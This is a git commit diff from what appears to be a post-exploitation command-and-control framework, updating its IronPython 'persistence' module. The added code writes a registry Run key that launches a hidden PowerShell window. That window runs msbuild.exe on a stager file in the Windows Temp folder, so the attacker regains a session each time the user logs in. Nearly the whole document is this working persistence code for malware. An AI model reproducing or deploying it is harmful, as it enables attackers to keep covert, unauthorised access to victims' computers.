fc22bfa165602f3d01782600c524f06235c00191
root <root@localhost.localdomain>
2019-04-25 15:06:48 +0200

    Persistence module

--- Server/modules/ipy/persistence.py
+++ Server/modules/ipy/persistence.py
@@ -2,11 +2,18 @@ class STModule:
     def __init__(self):
         self.name = 'ipy/persistence'
         self.language = 'ipy'
-        self.description = 'Persistence'
+        self.description = 'Set a new command in HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run registry key to launch the stager and get a session each time the user connects'
         self.author = '@maximemf'
-        self.options = {}
+        self.options = {
+            'Path': {
+                'Description'   :   'Path to the stager file',
+                'Required'      :   False,
+                'Value'         :   "C:\\\\WINDOWS\\\\Temp\\\\msbuild.xml"
+            }
+        }
 
     def payload(self):
         with open('modules/ipy/src/persistence.py', 'r') as module_src:
             src = module_src.read()
+            src = src.replace('PATH', self.options['Path']['Value'])
             return src
--- Server/modules/ipy/src/persistence.py
+++ Server/modules/ipy/src/persistence.py
@@ -1,11 +1,12 @@
-import winreg
+import _winreg as winreg
 
 def write_key():
     reg_key = winreg.OpenKey(
         winreg.HKEY_CURRENT_USER,
         r'Software\Microsoft\Windows\CurrentVersion\Run',
         0, winreg.KEY_SET_VALUE)
-    value = r'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe C:\msbuild.xml'
+    stager_path = "PATH"
+    value = r'powershell.exe -WindowStyle hidden -NoExit -Command C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe {}'.format(stager_path)
     with reg_key:
         winreg.SetValueEx(reg_key, 'ST', 0, winreg.REG_SZ, value)
     return 'Registry key set'
